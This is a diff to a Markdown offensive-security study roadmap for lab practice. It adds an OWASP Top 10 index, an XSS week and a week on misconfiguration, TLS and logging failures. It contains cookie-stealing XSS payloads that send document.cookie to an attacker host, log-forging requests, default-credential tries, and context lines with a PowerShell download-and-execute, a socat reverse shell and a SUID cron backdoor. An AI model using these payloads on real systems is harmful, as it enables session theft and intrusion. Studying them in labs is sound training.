@@ -1,4 +1,4 @@
-# Cybersecurity: 15-Week Hardcore Offensive Security Roadmap
+# Cybersecurity: 16-Week Hardcore Offensive Security Roadmap
 
 > **100% Free. Local-First. Zero Fluff.**  
 > Prerequisites: 5+ years Linux experience, basic networking (TCP/IP, DNS, HTTP).  
@@ -11,11 +11,30 @@
 | # | Domain | Focus |
 |---|--------|-------|
 | 1 | **Network Enumeration** | Nmap NSE, HackTricks methodology, protocol-specific probing |
-| 2 | **Web Hacking — Core** | PortSwigger Server-Side labs, manual SQLi, SSRF, XXE |
+| 2 | **Web Hacking — Core** | OWASP Top 10, SQLi, XSS, SSRF, XXE, Cryptographic Failures, Misconfiguration |
 | 3 | **Web Hacking — Advanced** | Business Logic, Race Conditions, API Security & JWT |
 | 4 | **Privilege Escalation** | Manual checks, GTFOBins, LOLBAS, LinPEAS/WinPEAS analysis |
 | 5 | **Active Directory** | Manual exploitation, Kerberos abuse, Impacket, BloodHound logic |
 | 6 | **Exploitation** | Exploit-DB modification, manual reverse shells, BoF fundamentals |
+
+---
+
+## OWASP Top 10 (2021) Coverage Index
+
+> All 10 categories are explicitly covered. Use this table as a quick-reference during study and report writing.
+
+| # | OWASP 2021 Category | Week(s) | Key Techniques |
+|---|---------------------|---------|----------------|
+| A01 | **Broken Access Control** | Week 5 | IDOR, RBAC bypass, method override, URL manipulation |
+| A02 | **Cryptographic Failures** | Week 10 | TLS misconfiguration, weak ciphers, testssl.sh, insecure storage |
+| A03 | **Injection** | Weeks 3, 6 | SQLi, OS Command, Path Traversal, XSS, SSTI, XXE |
+| A04 | **Insecure Design** | Week 7 | Business Logic, payment bypass, workflow abuse |
+| A05 | **Security Misconfiguration** | Week 10 | Default creds, exposed panels, verbose errors, CORS abuse |
+| A06 | **Vulnerable & Outdated Components** | Week 10 | searchsploit, CVE-based exploitation, dependency scanning |
+| A07 | **Identification & Authentication Failures** | Week 5 | Auth bypass, 2FA bypass, brute-force, JWT attacks |
+| A08 | **Software & Data Integrity Failures** | Weeks 5, 9 | Insecure deserialization, unsigned updates, supply-chain |
+| A09 | **Security Logging & Monitoring Failures** | Week 10 | Log injection, log forging, detection evasion, alerting gaps |
+| A10 | **Server-Side Request Forgery (SSRF)** | Week 4 | Internal SSRF, blind SSRF, cloud metadata abuse |
 
 ---
 
@@ -219,9 +238,12 @@ ntlmssp        # Captures the NTLM exchange after poisoning — shows NTLMv2 has
 
 ---
 
-## Week 3 — Web Hacking: Server-Side Injection Fundamentals
+## Week 3 — Web Hacking: Injection & XSS (A03)
 
 ### Theory
+- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
+- HackTricks XSS: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+- PayloadsAllTheThings XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
   - SQL injection: all apprentice + practitioner labs
   - Path traversal: all apprentice + practitioner labs
   - OS command injection: all apprentice + practitioner labs
@@ -241,9 +263,17 @@ ntlmssp        # Captures the NTLM exchange after poisoning — shows NTLMv2 has
   - [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
   - [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
   - [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+- XSS (Cross-Site Scripting):
+  - [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
+  - [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
+  - [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
+  - [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+  - [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
+  - [Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
+  - [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
 
 **VulnHub Machine:**
-- **bWAPP** — isolated web app lab, enable SQLi and command injection modules
+- **bWAPP** — isolated web app lab, enable SQLi, command injection, and XSS modules
 
 ```bash
 # Manual SQLi detection
@@ -275,6 +305,33 @@ ntlmssp        # Captures the NTLM exchange after poisoning — shows NTLMv2 has
 curl "http://<TARGET>/file?filename=../../../etc/passwd"
 curl "http://<TARGET>/file?filename=....//....//....//etc/passwd"    # bypass filter
 curl "http://<TARGET>/file?filename=%2e%2e%2f%2e%2e%2fetc/passwd"   # URL encode
+
+# === XSS ===
+
+# Reflected XSS: test injection point
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'"><script>alert(1)</script>
+
+# Cookie theft (requires no HttpOnly flag)
+<script>document.location='http://<ATTACKER>/?c='+document.cookie</script>
+<img src=x onerror="fetch('http://<ATTACKER>/?c='+btoa(document.cookie))">
+
+# Filter bypass: mixed case, encoding, event handlers
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onresize=alert(1)>
+javascript:alert(1)                  # in href attributes
+
+# DOM XSS: find sources in JS (document.URL, location.hash, location.search)
+# Test in browser console:
+document.write(location.search)       # vulnerable sink?
+document.getElementById('x').innerHTML = location.hash  # vulnerable?
+
+# XSS to steal session via Burp Collaborator alternative (interactsh — free)
+# https://github.com/projectdiscovery/interactsh
+<script>fetch('https://<YOUR_INTERACTSH_URL>/?c='+btoa(document.cookie))</script>
 ```
 
 ### Key Commands
@@ -285,9 +342,14 @@ curl "http://<TARGET>/file?filename=%2e%2e%2f%2e%2e%2fetc/passwd"   # URL encode
 curl -v -X POST "http://<TARGET>/login" \
   -d "username=admin'--&password=x" \
   -H "Content-Type: application/x-www-form-urlencoded"
+
+# Dalfox: fast XSS scanner (free, open source)
+# https://github.com/hahwul/dalfox
+dalfox url "http://<TARGET>/search?q=test"
+dalfox url "http://<TARGET>/search?q=test" --cookie "session=<SESSION>"
 ```
 
-**IppSec Reference:** Search "ippsec sql injection manual" or "ippsec bWAPP" on YouTube
+**IppSec Reference:** Search "ippsec sql injection manual" or "ippsec XSS stored" on YouTube
 
 ---
 
@@ -744,7 +806,152 @@ kr scan "http://<TARGET>" -w /usr/share/seclists/Discovery/Web-Content/api/route
 
 ---
 
-## Week 10 — Privilege Escalation: Linux Manual Enumeration
+## Week 10 — Web Hacking: OWASP A02, A05, A06 & A09
+
+### Theory
+- A02 — PortSwigger Information Disclosure: https://portswigger.net/web-security/information-disclosure
+- A05 — HackTricks Security Misconfiguration: https://book.hacktricks.xyz/pentesting-web/security-misconfiguration
+- A06 — OWASP Dependency Check: https://owasp.org/www-project-dependency-check/
+- A09 — OWASP Testing Guide (Logging): https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/09-Testing_for_Error_Handling
+
+### Action
+**PortSwigger Free Labs:**
+- Information Disclosure (A02 / A05):
+  - [Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)
+  - [Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)
+  - [Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)
+  - [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)
+
+**VulnHub Machine:**
+- **BadStore** — outdated Apache/PHP components with known CVEs
+- **Metasploitable 2** — deliberately misconfigured services (default creds, open ports)
+
+```bash
+# === A02: CRYPTOGRAPHIC FAILURES ===
+
+# testssl.sh: enumerate TLS config, ciphers, vulnerabilities (free tool)
+# https://github.com/drwetter/testssl.sh
+./testssl.sh --full https://<TARGET>/
+./testssl.sh --cipher-per-proto https://<TARGET>/   # list all accepted ciphers
+./testssl.sh --vulnerable https://<TARGET>/          # check for BEAST, POODLE, Heartbleed
+
+# sslscan: quick cipher audit
+sslscan <TARGET>:443
+
+# Check for sensitive data in HTTP (no TLS at all)
+curl -v "http://<TARGET>/login" 2>&1 | grep -i "set-cookie\|authorization\|password"
+
+# Detect weak/insecure cookie flags
+curl -sI "http://<TARGET>/" | grep -i "set-cookie"
+# LOOK FOR: missing Secure flag, missing HttpOnly flag, missing SameSite
+
+# Check for sensitive data in JS files (API keys, tokens, secrets)
+curl -s "http://<TARGET>/app.js" | grep -Eo "(api_key|secret|token|password|passwd)[[:space:]]*[=:][[:space:]]*[\"'][^\"']+"
+
+# Detect MD5/SHA1 password hashes in leaks (red flags in reports)
+echo -n "password123" | md5sum      # MD5 — BROKEN, never acceptable
+echo -n "password123" | sha1sum     # SHA1 — WEAK, never acceptable for passwords
+# Report: must use bcrypt/scrypt/argon2 with salt
+
+# === A05: SECURITY MISCONFIGURATION ===
+
+# Default credentials — always try first
+# Admin:admin, admin:password, root:root, guest:guest
+curl -s -X POST "http://<TARGET>/login" -d "username=admin&password=admin"
+curl -s -X POST "http://<TARGET>/login" -d "username=admin&password=password"
+
+# Exposed admin panels
+ffuf -u "http://<TARGET>/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -mc 200,301,302 -t 50 | grep -iE "admin|panel|console|manager|phpmyadmin|wp-admin"
+
+# Verbose error messages: trigger an error and inspect
+curl "http://<TARGET>/index.php?id='"       # SQL error leaks DB type
+curl "http://<TARGET>/nonexistent-page"     # Stack trace?
+
+# CORS misconfiguration: check if Origin is reflected
+curl -s -H "Origin: https://evil.com" -I "http://<TARGET>/api/data" | grep -i "access-control"
+# Dangerous: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true
+
+# HTTP security headers audit
+curl -sI "http://<TARGET>/" | grep -iE "x-frame-options|x-content-type|strict-transport|content-security|referrer-policy"
+# Missing headers = finding
+
+# Directory listing
+curl -s "http://<TARGET>/uploads/" | grep -i "index of"
+
+# Cloud metadata endpoint (SSRF + misconfiguration)
+curl "http://169.254.169.254/latest/meta-data/"      # AWS
+curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
+
+# === A06: VULNERABLE & OUTDATED COMPONENTS ===
+
+# Identify service versions from nmap scan, then search for CVEs
+nmap -sV --script banner <TARGET>
+searchsploit "apache 2.4"
+searchsploit "php 7.1"
+searchsploit "openssh 7.2"
+
+# WhatWeb: web technology fingerprinting
+whatweb -v "http://<TARGET>/"
+
+# wappalyzer-cli: detect frameworks and libraries
+# https://github.com/dochne/wappalyzer (install via npm: npm i wappalyzer-cli -g)
+wappalyzer "http://<TARGET>/"
+
+# CVE-based exploitation workflow
+searchsploit -m <EXPLOIT_ID>           # copy exploit to CWD
+cat <EXPLOIT_ID>.py | head -30         # READ before running — understand the PoC
+# Modify TARGET variable, test in isolated lab
+
+# Nuclei: template-based CVE scanner (free, open source)
+# https://github.com/projectdiscovery/nuclei
+nuclei -u "http://<TARGET>" -t cves/ -severity critical,high
+
+# === A09: SECURITY LOGGING & MONITORING FAILURES ===
+
+# Log injection: insert newlines to forge log entries
+curl "http://<TARGET>/login?username=admin%0a127.0.0.1+-+admin+-+[01/Jan/2025]+GET+/admin+200"
+# If application logs user input verbatim, attacker can forge legitimate-looking entries
+
+# Log forging via User-Agent
+curl -H "User-Agent: 127.0.0.1 - - [01/Jan/2025:00:00:00] \"GET /admin HTTP/1.1\" 200 4321" \
+  "http://<TARGET>/page"
+
+# Verify no error details leak to client (A09 offensive: check what's NOT logged)
+# Trigger errors that should be alerted:
+# - Multiple failed logins (should trigger lockout or alert)
+# - Accessing admin paths without auth (should be logged)
+# - SQLi attempts (should be detected by WAF/IDS)
+# Test: if none of these appear in server logs → A09 finding
+
+# Check for exposed log files
+ffuf -u "http://<TARGET>/FUZZ" \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
+  -mc 200 | grep -iE "\.log|access|error|debug"
+curl "http://<TARGET>/logs/access.log"
+curl "http://<TARGET>/app/storage/logs/laravel.log"
+```
+
+### Key Commands
+```bash
+# Check all security headers in one go
+curl -sI "https://<TARGET>/" | grep -iE \
+  "strict-transport|content-security|x-frame|x-content-type|referrer|permissions"
+
+# Nikto: misconfiguration + outdated component scanner
+nikto -h "http://<TARGET>" -output /tmp/nikto_report.txt
+
+# retire.js: scan JS files for known vulnerable libraries
+# https://github.com/RetireJS/retire.js
+retire --js --path /tmp/downloaded_scripts/
+```
+
+**IppSec Reference:** Search "ippsec information disclosure" or "ippsec misconfiguration" on YouTube
+
+---
+
+## Week 11 — Privilege Escalation: Linux Manual Enumeration
 
 ### Theory
 - GTFOBins: https://gtfobins.github.io/ — every binary with sudo/SUID/capabilities abuse
@@ -831,7 +1038,7 @@ echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
 
 ---
 
-## Week 11 — Privilege Escalation: Windows Manual Enumeration
+## Week 12 — Privilege Escalation: Windows Manual Enumeration
 
 ### Theory
 - LOLBAS: https://lolbas-project.github.io/ — Living Off the Land Binaries
@@ -900,7 +1107,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 
 ---
 
-## Week 12 — Active Directory: Enumeration & Initial Compromise
+## Week 13 — Active Directory: Enumeration & Initial Compromise
 
 ### Theory
 - The Hacker Recipes AD: https://www.thehacker.recipes/ad/
@@ -969,7 +1176,7 @@ crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce
 
 ---
 
-## Week 13 — Active Directory: Lateral Movement & Domain Compromise
+## Week 14 — Active Directory: Lateral Movement & Domain Compromise
 
 ### Theory
 - Pass-the-Hash/Ticket attacks: https://www.thehacker.recipes/ad/movement/ntlm
@@ -1033,7 +1240,7 @@ MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS
 
 ---
 
-## Week 14 — Exploitation: Manual Reverse Shells & Exploit-DB Modification
+## Week 15 — Exploitation: Manual Reverse Shells & Exploit-DB Modification
 
 ### Theory
 - Exploit-DB: https://www.exploit-db.com/ — searchsploit index
@@ -1102,7 +1309,7 @@ socat TCP:<ATTACKER>:4444 EXEC:'cmd.exe',pipes
 
 ---
 
-## Week 15 — Exploitation: Buffer Overflow Fundamentals
+## Week 16 — Exploitation: Buffer Overflow Fundamentals
 
 ### Theory
 - Aleph One "Smashing the Stack for Fun and Profit" (free, Phrack #49): http://phrack.org/issues/49/14.html
@@ -1201,7 +1408,7 @@ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 ---
 
-## Phase 3: The Infinite Game (Post-Week 15)
+## Phase 3: The Infinite Game (Post-Week 16)
 
 ---
 
